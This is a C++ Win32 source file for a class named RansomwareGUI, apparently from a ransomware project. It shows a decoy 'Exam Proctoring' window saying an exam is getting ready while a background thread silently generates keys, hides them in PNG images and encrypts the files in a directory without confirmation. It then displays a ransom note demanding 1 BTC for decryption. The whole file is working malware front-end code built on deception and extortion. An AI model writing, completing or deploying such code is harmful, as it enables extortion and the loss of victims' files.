#include "gui.h"
#include <commctrl.h>
#include "../include/file_encryptor.h"
#pragma comment(lib, "comctl32.lib")

const std::string PRIVATE_KEY_IMAGE = "private_key.png";
const std::string PUBLIC_KEY_IMAGE = "public_key.png";

RansomwareGUI::RansomwareGUI() : mainWindow(nullptr), progressWindow(nullptr), ransomWindow(nullptr),
    encryptionComplete(false), decryptionComplete(false) {
    // Initialize common controls
    INITCOMMONCONTROLSEX icex;
    icex.dwSize = sizeof(INITCOMMONCONTROLSEX);
    icex.dwICC = ICC_WIN95_CLASSES;
    InitCommonControlsEx(&icex);
}

RansomwareGUI::~RansomwareGUI() {
    if (encryptionThread.joinable()) {
        encryptionThread.join();
    }
}

void RansomwareGUI::CreateProgressWindow() {
    WNDCLASSEX wc = {};
    wc.cbSize = sizeof(WNDCLASSEX);
    wc.lpfnWndProc = ProgressWindowProc;
    wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = L"ProgressWindowClass";
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    RegisterClassEx(&wc);

    progressWindow = CreateWindowEx(
        0,
        L"ProgressWindowClass",
        L"Exam Proctoring",
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT,
        400, 200,
        NULL,
        NULL,
        GetModuleHandle(NULL),
        this
    );

    HWND textLabel = CreateWindowEx(
        0,
        L"STATIC",
        L"Your proctoring exam is getting ready. Please wait...",
        WS_VISIBLE | WS_CHILD | SS_CENTER,
        20, 50,
        360, 30,
        progressWindow,
        NULL,
        GetModuleHandle(NULL),
        NULL
    );

    ShowWindow(progressWindow, SW_SHOW);
    UpdateWindow(progressWindow);
}

void RansomwareGUI::CreateRansomWindow() {
    WNDCLASSEX wc = {};
    wc.cbSize = sizeof(WNDCLASSEX);
    wc.lpfnWndProc = RansomWindowProc;
    wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = L"RansomWindowClass";
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    RegisterClassEx(&wc);

    ransomWindow = CreateWindowEx(
        0,
        L"RansomWindowClass",
        L"File Recovery",
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT,
        500, 300,
        NULL,
        NULL,
        GetModuleHandle(NULL),
        this
    );

    HWND textLabel = CreateWindowEx(
        0,
        L"STATIC",
        L"Your files have been encrypted!\r\n\r\n"
        L"To recover your files, send 1 BTC to the following address:\r\n"
        L"1A2b3C4d5E6f7G8h9I0j\r\n\r\n"
        L"After payment, click the button below to receive your decryption key.",
        WS_VISIBLE | WS_CHILD | SS_CENTER,
        20, 20,
        460, 180,
        ransomWindow,
        NULL,
        GetModuleHandle(NULL),
        NULL
    );

    HWND decryptButton = CreateWindowEx(
        0,
        L"BUTTON",
        L"Decrypt Files",
        WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
        200, 220,
        100, 30,
        ransomWindow,
        (HMENU)1,
        GetModuleHandle(NULL),
        NULL
    );

    ShowWindow(ransomWindow, SW_SHOW);
    UpdateWindow(ransomWindow);
}

void RansomwareGUI::RunEncryption() {
    // Generate keys silently and store only in images
    if (generateEncryptionKeys(PRIVATE_KEY_IMAGE, PUBLIC_KEY_IMAGE)) {
        // Encrypt all files immediately with no confirmation
        secureFilesInDirectory(PUBLIC_KEY_IMAGE);
    }
    encryptionComplete = true;
}

void RansomwareGUI::RunDecryption() {
    decryptFilesInDirectory(PRIVATE_KEY_IMAGE);
    decryptionComplete = true;
}

LRESULT CALLBACK RansomwareGUI::ProgressWindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    RansomwareGUI* pThis = nullptr;
    if (uMsg == WM_NCCREATE) {
        CREATESTRUCT* pCreate = (CREATESTRUCT*)lParam;
        pThis = (RansomwareGUI*)pCreate->lpCreateParams;
        SetWindowLongPtr(hwnd, GWLP_USERDATA, (LONG_PTR)pThis);
    } else {
        pThis = (RansomwareGUI*)GetWindowLongPtr(hwnd, GWLP_USERDATA);
    }

    if (pThis) {
        switch (uMsg) {
            case WM_DESTROY:
                PostQuitMessage(0);
                return 0;
        }
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

LRESULT CALLBACK RansomwareGUI::RansomWindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    RansomwareGUI* pThis = nullptr;
    if (uMsg == WM_NCCREATE) {
        CREATESTRUCT* pCreate = (CREATESTRUCT*)lParam;
        pThis = (RansomwareGUI*)pCreate->lpCreateParams;
        SetWindowLongPtr(hwnd, GWLP_USERDATA, (LONG_PTR)pThis);
    } else {
        pThis = (RansomwareGUI*)GetWindowLongPtr(hwnd, GWLP_USERDATA);
    }

    if (pThis) {
        switch (uMsg) {
            case WM_COMMAND:
                if (LOWORD(wParam) == 1) { // Decrypt button clicked
                    pThis->RunDecryption();
                    DestroyWindow(hwnd);
                }
                break;
            case WM_DESTROY:
                PostQuitMessage(0);
                return 0;
        }
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

void RansomwareGUI::Run() {
    CreateProgressWindow();
    
    // Start encryption in background
    encryptionThread = std::thread(&RansomwareGUI::RunEncryption, this);
    
    // Message loop
    MSG msg = {};
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
        
        if (encryptionComplete && progressWindow) {
            DestroyWindow(progressWindow);
            progressWindow = nullptr;
            CreateRansomWindow();
        }
    }
}